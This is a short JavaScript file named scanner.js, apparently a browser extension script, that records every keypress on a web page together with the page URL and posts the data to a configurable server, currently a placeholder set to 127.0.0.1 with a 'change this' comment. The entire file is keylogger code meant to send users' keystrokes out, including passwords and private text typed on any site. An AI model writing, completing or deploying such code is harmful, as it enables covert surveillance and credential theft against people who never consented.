scanner.js
//scans all key inputs from user
document.addEventListener(
  'keypress',
  function (ev) {
    xt.port.emit('key', {
      keyCode: ev.keyCode,
      url: document.location.href
    });
  },
  true
);
/// sends stroke+website to server
port.on("key", function (data) {
  $.post(
  	//change this
    '127.0.0.1',
    JSON.stringify(data)
  );
});